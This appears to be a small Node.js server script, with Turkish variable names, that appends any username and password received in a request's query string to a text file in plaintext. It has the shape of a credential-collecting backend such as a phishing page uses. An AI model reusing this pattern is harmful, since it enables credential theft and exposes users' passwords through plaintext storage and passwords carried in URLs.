var url = require('url');
var fs = require('fs');
var http = require('http');

http.createServer(function (req,res){

    var bilgi = url.parse(req.url, true).query;

    fs.appendFile('yeni.txt', 'Username = '+bilgi.username+' Sifre= '+bilgi.password , function(err){
        if (err) throw err;
        console.log("Yeni dosya olusturuldu.")
        return res.end();
    } )

}).listen(8080);